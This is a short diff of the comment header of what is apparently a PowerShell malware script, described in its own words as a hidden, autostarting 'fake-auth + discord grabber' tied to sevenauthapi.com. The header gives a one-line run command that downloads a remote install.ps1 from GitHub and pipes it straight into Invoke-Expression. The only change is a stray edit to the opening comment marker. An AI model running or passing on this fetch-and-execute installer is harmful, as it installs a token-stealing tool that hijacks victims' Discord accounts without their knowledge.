@@ -1,4 +1,4 @@
-<#
+<#3V
   sevenauthapi.com local fake-auth + discord grabber (all-in-one, autostart, hidden)
 
   Run  : irm -useb https://raw.githubusercontent.com/MarcoCOdev1/d/main/install.ps1 | iex
